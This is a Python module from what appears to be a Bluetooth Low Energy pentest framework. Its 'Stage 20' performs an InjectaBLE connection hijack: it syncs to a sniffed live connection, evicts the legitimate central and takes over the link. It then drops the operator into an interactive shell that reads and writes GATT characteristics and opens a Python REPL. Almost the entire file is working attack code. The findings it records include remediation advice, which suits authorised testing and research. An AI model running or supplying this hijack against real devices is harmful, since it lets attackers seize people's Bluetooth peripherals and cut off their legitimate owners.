"""
Stage 20 — BLE Connection Hijacker

Synchronises with a live BLE connection captured in Stage 2 (CONNECT_IND) and
attempts to take it over using WHAD's Hijacker connector (InjectaBLE technique).
On success the legitimate Central is de-synchronized and our adapter acts as the
new Central — giving full GATT read/write access to the peripheral.

After a successful hijack the operator is offered the S5 interactive GATT shell
automatically.  This is the most powerful combo in the framework: passive sniff →
active hijack → live GATT exploration, all in one flow.

Hardware note: requires can_reactive_jam on the BLE dongle (ButteRFly nRF52840
supports this; HCI adapters do NOT — they cannot sync to arbitrary connections).

Findings:
  ble_connection_hijacked  (critical) — connection taken over; peripheral was
                                        accessible without pairing by the hijacker
"""

from __future__ import annotations

import time
import threading
from datetime import datetime, timezone

from core.dongle import WhadDongle
from core.models import Connection, Target, Finding
from core.db import insert_finding
from core.logger import get_logger, prompt_line
import config

log = get_logger("s20_hijack")

_SYNC_TIMEOUT   = config.HIJACK_SYNC_TIMEOUT
_HIJACK_TIMEOUT = config.HIJACK_EXEC_TIMEOUT
_POST_GATT_ENUM = True # run quick GATT enumeration after successful hijack


def run(
    dongle: WhadDongle,
    conn: Connection,
    target: Target | None,
    engagement_id: str,
    profile: list[dict] | None = None,
) -> bool:
    """Attempt to hijack *conn* and optionally drop into GATT shell.

    Args:
        dongle:        Active WhadDongle (must have can_reactive_jam).
        conn:          Connection from S2 — provides AA, CRC, channel map, hop params.
        target:        Target object for the peripheral (may be None if not in gatt_profiles).
        engagement_id: Engagement ID for Finding storage.
        profile:       Existing GATT profile from S5 if available.

    Returns:
        True if hijack succeeded, False otherwise.
    """
    if not dongle.caps.can_reactive_jam:
        log.warning(
            "[S20] Hijacker requires can_reactive_jam — not supported by this dongle. "
            "ButteRFly (nRF52840) supports it; HCI adapters do not."
        )
        return False

    try:
        from whad.ble.connector.hijacker import Hijacker
    except ImportError:
        log.warning(
            "[S20] whad.ble.connector.hijacker not importable — "
            "WHAD version may not support Hijacker. Stage skipped."
        )
        return False

    aa      = conn.access_address
    crc     = conn.crc_init
    ch_map  = int(conn.channel_map, 16) if isinstance(conn.channel_map, str) else conn.channel_map
    hop_inc = conn.hop_increment
    hop_int = int(conn.interval_ms / 1.25)   # LL units (1.25 ms each)

    periph_addr = conn.peripheral_addr
    central_addr = conn.central_addr

    log.info(
        f"[S20] Hijack target: {periph_addr}  "
        f"AA=0x{aa:08X}  CRC=0x{crc:06X}  "
        f"hop={hop_inc}  interval={conn.interval_ms:.1f}ms  "
        f"chMap=0x{ch_map:010X}"
    )

    log.info(f"\n  [S20] Synchronising to connection "
          f"{central_addr} → {periph_addr} ...")
    log.info(f"       AA=0x{aa:08X}  CRC=0x{crc:06X}  "
          f"chMap={conn.channel_map}  hop={hop_inc}")
    log.info(f"       Sync window: {_SYNC_TIMEOUT}s\n")

    hijacker = _create_hijacker(dongle, Hijacker)
    if hijacker is None:
        return False

    synced  = False
    hijacked = False

    try:
        # --- Configure and start the hijacker ---
        _configure_hijacker(hijacker, aa, crc, ch_map, hop_inc, hop_int)
        hijacker.start()

        # --- Wait for connection sync ---
        synced = _wait_for_sync(hijacker, _SYNC_TIMEOUT, periph_addr)
        if not synced:
            log.warning(
                f"[S20] Could not synchronise to {periph_addr} within {_SYNC_TIMEOUT}s. "
                "The connection may have ended or moved to a channel pattern we cannot follow."
            )
            return False

        log.info(f"[S20] Synchronised! Attempting hijack of {periph_addr} ...")
        log.info(f"  [S20] Synchronised to live connection. Injecting hijack ...")

        # --- Perform the actual hijack ---
        hijacked = _do_hijack(hijacker, _HIJACK_TIMEOUT)

    except Exception as exc:
        log.error(f"[S20] Hijack error: {type(exc).__name__}: {exc}")
        return False
    finally:
        if not hijacked:
            try:
                hijacker.stop()
            except Exception:
                pass

    if not hijacked:
        log.info(f"[S20] Hijack attempt failed for {periph_addr}.")
        _record_attempt_finding(conn, engagement_id)
        return False

    log.info(f"[S20] *** HIJACK SUCCEEDED: {periph_addr} ***")
    log.info(f"\n  [S20] HIJACK SUCCESSFUL — {periph_addr}")
    log.info(f"       We are now the Central. Legitimate device {central_addr}")
    log.info(f"       has been de-synchronized and lost its connection.\n")

    _record_hijack_finding(conn, engagement_id, profile)

    # --- Post-hijack GATT shell ---
    _post_hijack_gatt_shell(hijacker, conn, target, engagement_id, profile)

    try:
        hijacker.stop()
    except Exception:
        pass
    return True


# ── Hijacker lifecycle helpers ─────────────────────────────────────────────────

def _create_hijacker(dongle: WhadDongle, Hijacker):
    """Instantiate a Hijacker connector on dongle.device."""
    try:
        h = Hijacker(dongle.device)
        log.debug("[S20] Hijacker connector created.")
        return h
    except Exception as exc:
        log.error(f"[S20] Cannot create Hijacker: {type(exc).__name__}: {exc}")
        return None


def _configure_hijacker(hijacker, aa: int, crc: int, ch_map: int,
                         hop_inc: int, hop_int: int) -> None:
    """Apply connection parameters to the hijacker connector.

    WHAD Hijacker accepts parameters via sniff_connection() or direct properties
    depending on the version. We try both patterns.
    """
    # Pattern 1: sniff_connection() with keyword arguments
    for method_name in ("sniff_connection", "configure"):
        fn = getattr(hijacker, method_name, None)
        if fn is None:
            continue
        try:
            fn(
                access_address=aa,
                crc_init=crc,
                channel_map=ch_map,
                hop_increment=hop_inc,
                hop_interval=hop_int,
            )
            log.debug(f"[S20] Configured via hijacker.{method_name}()")
            return
        except Exception as exc:
            log.debug(f"[S20] {method_name}() failed: {exc}")

    # Pattern 2: direct property assignment
    for attr, val in [
        ("access_address", aa), ("crc_init", crc), ("channel_map", ch_map),
        ("hop_increment", hop_inc), ("hop_interval", hop_int),
    ]:
        try:
            setattr(hijacker, attr, val)
        except Exception as exc:
            log.debug(f"[S20] hijacker.{attr} = {val}: {exc}")


def _wait_for_sync(hijacker, timeout: float, periph_addr: str) -> bool:
    """Poll the hijacker for connection sync status.

    Returns True when the hijacker reports it is synchronised with the target
    connection, False if we exhaust the timeout.
    """
    deadline = time.time() + timeout
    while time.time() < deadline:
        # Check sync via property or method, depending on WHAD version
        synced = (
            getattr(hijacker, "synchronized", False)
            or getattr(hijacker, "is_synchronized", lambda: False)()
            or getattr(hijacker, "synced", False)
        )
        if synced:
            return True
        time.sleep(0.25)
        remaining = deadline - time.time()
        if remaining <= 0:
            break
    return False


def _do_hijack(hijacker, timeout: float) -> bool:
    """Call hijack() and wait up to *timeout* seconds for result."""
    result_holder: list[bool] = [False]
    done = threading.Event()

    def _call() -> None:
        try:
            fn = getattr(hijacker, "hijack", None)
            if fn is None:
                log.warning("[S20] hijacker.hijack() not found — cannot hijack.")
                return
            result = fn()
            if isinstance(result, bool):
                result_holder[0] = result
            else:
                # Some versions raise on failure, return nothing on success
                result_holder[0] = True
        except Exception as exc:
            log.debug(f"[S20] hijack() exception: {type(exc).__name__}: {exc}")
        finally:
            done.set()

    t = threading.Thread(target=_call, daemon=True)
    t.start()
    done.wait(timeout=timeout)
    return result_holder[0]


# ── Post-hijack GATT shell ─────────────────────────────────────────────────────

def _post_hijack_gatt_shell(
    hijacker,
    conn: Connection,
    target: Target | None,
    engagement_id: str,
    profile: list[dict] | None,
) -> None:
    """After a successful hijack, optionally drop into the GATT interactive shell.

    The hijacker connector acts as the new Central. We attempt to enumerate the
    GATT profile (unless one is already available from S5), then launch the shell.
    """
    periph_addr = conn.peripheral_addr

    # Try to get a PeripheralDevice from the hijacker to run GATT ops
    periph_dev = _get_periph_from_hijacker(hijacker)

    if periph_dev is None:
        log.warning(
            "[S20] Cannot get PeripheralDevice from hijacker — "
            "GATT shell unavailable. Raw connection is yours though."
        )
        return

    if profile is None:
        profile = _quick_gatt_enum(periph_dev, periph_addr)

    if profile is None:
        log.info("  [S20] GATT enumeration failed. Entering raw shell anyway.")
        profile = []

    # Manufacture a minimal Target if we don't have one
    if target is None:
        target = Target(
            bd_address=periph_addr,
            address_type="public",
            name=None,
            manufacturer=None,
            device_class="unknown",
            risk_score=10,
            connectable=True,
        )

    log.info(
        "\n  [S20] Entering GATT shell on HIJACKED connection.\n"
        "       The legitimate central has been evicted. You own this link.\n"
    )

    try:
        from stages.s5_interact import shell as _gatt_shell
        _gatt_shell_on_hijacked(periph_dev, target, profile, engagement_id)
    except Exception as exc:
        log.warning(f"[S20] GATT shell error: {type(exc).__name__}: {exc}")


def _gatt_shell_on_hijacked(periph_dev, target, profile: list[dict], engagement_id: str) -> None:
    """Minimal inline GATT shell used when the connection is already open (hijacked).

    We can't call s5_interact.shell() directly because it reconnects — the hijack
    already owns the connection. Instead we reuse the REPL logic inline.
    """
    import code as _code

    by_handle: dict[int, dict] = {
        c["value_handle"]: c
        for c in profile
        if isinstance(c.get("value_handle"), int) and c["value_handle"] > 0
    }
    addr = target.bd_address

    log.info("\n" + "═" * 76)
    log.info("  HIJACKED GATT SHELL")
    log.info(f"  Target : {addr}  (connection owned by us)")
    log.info("  Commands: read  write  wnr  info  pyshell  quit")
    log.info("═" * 76)
    _print_handle_table(profile, by_handle)


    try:
        import readline as _rl
        _rl.parse_and_bind("tab: complete")
    except ImportError:
        pass

    while True:
        try:
            raw = prompt_line("  hijack> ").strip()
        except (EOFError, KeyboardInterrupt):

            break
        if not raw:
            continue
        parts = raw.split()
        cmd = parts[0].lower()

        if cmd in ("quit", "exit", "q"):
            break

        elif cmd == "info":
            _print_handle_table(profile, by_handle)

        elif cmd == "read":
            if len(parts) < 2:
                log.info("  Usage: read <handle>")
                continue
            try:
                h = int(parts[1], 0)
                val = periph_dev.read(h)
                if val is None:
                    log.info(f"  h={h}: (empty)")
                else:
                    hex_s = val.hex() if isinstance(val, bytes) else str(val)
                    text_s = val.decode("utf-8", errors="replace").strip("\x00") if isinstance(val, bytes) else str(val)
                    name = by_handle.get(h, {}).get("uuid_name") or ""
                    log.info(f"  h={h} {name}:")
                    log.info(f"    hex  : {hex_s}")
                    log.info(f"    text : {text_s or '(binary)'}")
            except Exception as exc:
                log.info(f"  read h={parts[1]} → {type(exc).__name__}: {exc}")

        elif cmd == "write":
            if len(parts) < 3:
                log.info("  Usage: write <handle> <hex>")
                continue
            try:
                h = int(parts[1], 0)
                data = bytes.fromhex(parts[2])
                periph_dev.write(h, data)
                log.info(f"  write h={h}: OK")
            except Exception as exc:
                log.info(f"  write → {type(exc).__name__}: {exc}")

        elif cmd == "wnr":
            if len(parts) < 3:
                log.info("  Usage: wnr <handle> <hex>")
                continue
            try:
                h = int(parts[1], 0)
                data = bytes.fromhex(parts[2])
                periph_dev.write_command(h, data)
                log.info(f"  wnr h={h}: OK")
            except Exception as exc:
                log.info(f"  wnr → {type(exc).__name__}: {exc}")

        elif cmd == "pyshell":
            log.info(
                "\n  Python REPL — locals: periph, profile, by_handle.\n"
                "  Ctrl-D to return to hijack shell.\n"
            )
            try:
                _code.interact(
                    banner="",
                    local={"periph": periph_dev, "profile": profile, "by_handle": by_handle},
                    exitmsg="  Back in hijack shell.",
                )
            except SystemExit:
                pass

        else:
            log.info(f"  Unknown: {cmd!r}  (read / write / wnr / info / pyshell / quit)")

    log.info(f"\n  [S20] Hijack shell closed — {addr}\n")


def _get_periph_from_hijacker(hijacker):
    """Try to extract a PeripheralDevice from the hijacker after takeover."""
    for attr in ("peripheral", "periph", "device", "peripheral_device", "target"):
        val = getattr(hijacker, attr, None)
        if val is not None and hasattr(val, "read"):
            return val
    # Some hijacker versions expose a method
    for method in ("get_peripheral", "get_device"):
        fn = getattr(hijacker, method, None)
        if fn is not None:
            try:
                result = fn()
                if result is not None and hasattr(result, "read"):
                    return result
            except Exception:
                pass
    return None


def _quick_gatt_enum(periph_dev, addr: str) -> list[dict]:
    """Minimal GATT enumeration via the hijacked PeripheralDevice."""
    profile: list[dict] = []
    done = threading.Event()

    def _discover():
        try:
            periph_dev.discover()
        except Exception as exc:
            log.debug(f"[S20] discover() error: {exc}")
        finally:
            done.set()

    t = threading.Thread(target=_discover, daemon=True)
    t.start()
    if not done.wait(timeout=20.0):
        log.warning("[S20] GATT discovery timed out after 20s.")
        return profile

    try:
        for svc in (getattr(periph_dev, "services", None) or []):
            for char in (getattr(svc, "characteristics", None) or []):
                uuid_str = str(getattr(char, "uuid", ""))
                handle = int(getattr(char, "handle", 0))
                val_handle = int(getattr(char, "value_handle", handle))
                raw_props = getattr(char, "properties", 0)
                props = _decode_props(raw_props)
                entry: dict = {
                    "uuid": uuid_str,
                    "uuid_name": "",
                    "handle": handle,
                    "value_handle": val_handle,
                    "properties": props,
                    "requires_auth": False,
                    "value_text": None,
                    "value_hex": None,
                }
                if "read" in props:
                    try:
                        raw = periph_dev.read(val_handle)
                        if raw:
                            entry["value_hex"] = raw.hex() if isinstance(raw, bytes) else str(raw)
                            entry["value_text"] = (
                                raw.decode("utf-8", errors="replace").strip("\x00")
                                if isinstance(raw, bytes) else str(raw)
                            )
                    except Exception:
                        pass
                profile.append(entry)
    except Exception as exc:
        log.debug(f"[S20] GATT enum error: {exc}")

    log.info(f"[S20] Post-hijack GATT: {len(profile)} characteristic(s) found on {addr}")
    return profile


def _decode_props(raw) -> list[str]:
    props = []
    if isinstance(raw, int):
        if raw & 0x02: props.append("read")
        if raw & 0x04: props.append("write_no_resp")
        if raw & 0x08: props.append("write")
        if raw & 0x10: props.append("notify")
        if raw & 0x20: props.append("indicate")
    elif isinstance(raw, (list, tuple)):
        props = [str(p) for p in raw]
    return props


def _print_handle_table(profile: list[dict], by_handle: dict) -> None:
    log.info(f"\n  {'H':>4}  {'UUID':<36}  {'NAME':<22}  PROPS")
    log.info("  " + "─" * 70)
    for c in sorted(profile, key=lambda x: x.get("value_handle", 0)):
        h = c.get("value_handle", 0)
        uuid_s = (c.get("uuid") or "")[:36]
        name = (c.get("uuid_name") or "")[:22]
        props = ",".join(c.get("properties") or [])[:20]
        val = c.get("value_text") or ""
        if val and len(val) > 16: val = val[:15] + "…"
        val_col = f"  [{val}]" if val else ""
        log.info(f"  {h:>4}  {uuid_s:<36}  {name:<22}  {props}{val_col}")


# ── Findings ───────────────────────────────────────────────────────────────────

def _record_hijack_finding(conn: Connection, engagement_id: str, profile: list[dict] | None) -> None:
    insert_finding(Finding(
        type="ble_connection_hijacked",
        severity="critical",
        target_addr=conn.peripheral_addr,
        description=(
            f"BLE connection between {conn.central_addr} and {conn.peripheral_addr} "
            f"was successfully hijacked. The legitimate Central was de-synchronized "
            f"and our adapter took over the link "
            f"(InjectaBLE technique, AA=0x{conn.access_address:08X}). "
            f"Full GATT access was obtained without pairing."
        ),
        remediation=(
            "Implement connection integrity monitoring on the peripheral side "
            "(e.g. detect unexpected LL_TERMINATE from original central). "
            "Use LE Secure Connections with bonding so un-bonded centrals are rejected. "
            "Time-bound sessions and require re-authentication after disconnection."
        ),
        evidence={
            "central_addr": conn.central_addr,
            "peripheral_addr": conn.peripheral_addr,
            "access_address": f"0x{conn.access_address:08X}",
            "crc_init": f"0x{conn.crc_init:06X}",
            "hop_increment": conn.hop_increment,
            "interval_ms": conn.interval_ms,
            "gatt_chars_found": len(profile) if profile else 0,
        },
        pcap_path=None,
        engagement_id=engagement_id,
    ))
    log.info(f"FINDING [critical] ble_connection_hijacked: {conn.peripheral_addr}")


def _record_attempt_finding(conn: Connection, engagement_id: str) -> None:
    insert_finding(Finding(
        type="ble_hijack_attempted",
        severity="info",
        target_addr=conn.peripheral_addr,
        description=(
            f"BLE connection hijack attempted against {conn.peripheral_addr} "
            f"(AA=0x{conn.access_address:08X}) but failed to synchronise within "
            f"{_SYNC_TIMEOUT}s. Connection may have terminated or been too brief "
            f"to follow."
        ),
        remediation=(
            "No action needed — this stage tests resilience but the hijack failed. "
            "Consider time-bound sessions and re-authentication to limit exposure."
        ),
        evidence={
            "central_addr": conn.central_addr,
            "peripheral_addr": conn.peripheral_addr,
            "access_address": f"0x{conn.access_address:08X}",
        },
        pcap_path=None,
        engagement_id=engagement_id,
    ))
